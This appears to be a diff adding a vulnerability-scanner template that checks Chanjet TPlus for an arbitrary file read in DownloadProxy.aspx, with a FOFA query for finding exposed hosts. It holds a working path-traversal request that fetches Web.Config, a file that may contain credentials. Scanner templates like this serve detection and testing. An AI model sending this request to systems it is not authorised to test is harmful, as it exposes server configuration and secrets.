@@ -1,0 +1,34 @@
+id: chanjet-tplus-file-read
+
+info:
+  name: Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read
+  author: xc
+  severity: high
+  description: |
+    Chanjet TPlus DownloadProxy.aspx file has an arbitrary file reading vulnerability. An attacker can obtain sensitive files on the server through the vulnerability.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="畅捷通-TPlus"
+  tags: yonyou,chanjet,lfi,tplus
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "xml version"
+          - "<configuration>"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+
+# digest: 4a0a0047304502205a2ae1b2199ca95a7c8e854c029919de3ba095e5edcea643b79134693bb8a113022100ac64ec522e98c1856b2014a3cdfa87456970e08220cf0fef83657cbac4dcb4f9:922c64590222798bb761d5b6d8e72950
